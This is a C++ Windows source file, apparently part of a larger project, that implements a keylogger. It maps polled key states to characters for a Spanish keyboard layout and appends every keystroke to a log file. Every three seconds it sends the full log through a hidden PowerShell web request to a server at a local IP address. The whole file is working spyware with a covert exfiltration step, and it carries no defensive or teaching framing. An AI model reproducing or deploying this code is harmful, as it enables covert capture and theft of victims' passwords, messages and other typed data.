#include "pch.h"
#include <windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <chrono>
#include <atomic>

#include "utils.h"



char getCharFromKey(int key, bool shiftPressed, bool altGrPressed) {

    if (key >= 'A' && key <= 'Z') {
        bool capsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        if (shiftPressed ^ capsLockActive) return key;
        else return key + 32;
    }


    if (key >= '0' && key <= '9') {
        if (shiftPressed) {
            static const char shiftNumbers[] = { '=', '!', '\"', '·', '$', '%', '&', '/', '(', ')', '?' };
            return shiftNumbers[key - '0'];
        }
        else if (altGrPressed) {

            static const char altGrNumbers[] = { '|', '@', '#', '~', '€', '[', ']', '{', '}', '\\', '|' };
            return altGrNumbers[key - '0'];
        }
        return key;
    }

    if (shiftPressed) {
        switch (key) {
        case VK_OEM_1: return 'Ñ';
        case VK_OEM_PLUS: return '*';
        case VK_OEM_COMMA: return ';';
        case VK_OEM_MINUS: return '_';
        case VK_OEM_PERIOD: return ':';
        case VK_OEM_2: return '?';
        case VK_OEM_3: return '^';
        case VK_OEM_4: return '¡';
        case VK_OEM_5: return '€';
        case VK_OEM_6: return '&';
        case VK_OEM_7: return '/';
        case VK_OEM_102: return '>';

        default: break;
        }
    }

    if (altGrPressed) {
        switch (key) {

        case '2': return '@';
        case '3': return '#';
        case 'E': return '€';
        case '4': return '~';
        case '5': return '½';
        case 'Q': return '\\';
        case 'W': return '|';
        case 'M': return 'µ';
        case 'R': return '¬';

        default: break;
        }
    }


    switch (key) {
    case VK_SPACE: return ' ';
    case VK_OEM_1: return 'ñ';
    case VK_OEM_PLUS: return '+';
    case VK_OEM_COMMA: return ',';
    case VK_OEM_MINUS: return '-';
    case VK_OEM_PERIOD: return '.';
    case VK_OEM_2: return '\'';
    case VK_OEM_3: return '`';
    case VK_OEM_4: return '[';
    case VK_OEM_5: return '\\';
    case VK_OEM_6: return ']';
    case VK_OEM_7: return 'ç';
    case VK_OEM_102: return '<';

    default: break;
    }

    return 0;

}

void sendKeylogToServer(const std::string& logFilePath) {
    std::ifstream logFile(logFilePath);
    std::string escapedKeystrokes;

    if (logFile) {
    
        std::stringstream buffer;
        buffer << logFile.rdbuf();
        escapedKeystrokes = buffer.str();

   
        logFile.close();
    }
    else {
        std::cerr << "Error al abrir el archivo de registro" << std::endl;
        return;
    }


    std::string clientId = "1";
    std::string jsonBody = "{\\\"client_id\\\": " + clientId + ", \\\"text\\\": \\\"" + escapedKeystrokes + "\\\"}";

    std::string cmd = "powershell.exe -Command \"$body = '" + jsonBody + "';Invoke-WebRequest -Uri 'http://192.168.1.26:8000/keystroke-logs' -Method PUT -Body $body -ContentType 'application/json' -UseBasicParsing\"";
    std::string postKeystrokeLogOutput;
    ExecuteCommandHidden(cmd.c_str(), postKeystrokeLogOutput);
}


void logKeyStrokes(const std::string& logFilePath, bool keysState[], std::atomic<bool>& running) {
    auto lastSend = std::chrono::steady_clock::now(); 
    while (running) {
        for (int key = 8; key <= 222; key++) {
            short keyState = GetAsyncKeyState(key);

            if (keyState & 0x0001) {
                if (!keysState[key]) {
                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    bool altGrPressed = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0 && (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

                    char ch = getCharFromKey(key, shiftPressed, altGrPressed);
                    if (ch != 0) {
                        std::ofstream logFile(logFilePath, std::ios_base::app);
                        logFile << ch;
                        logFile.close();
                    }

                    keysState[key] = true;
                }
            }
            else {
                keysState[key] = false;
            }
        }

        auto now = std::chrono::steady_clock::now();
     
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastSend).count() >= 3) {
            sendKeylogToServer(logFilePath); 
            lastSend = now; 
        }

        Sleep(100);
    }
}

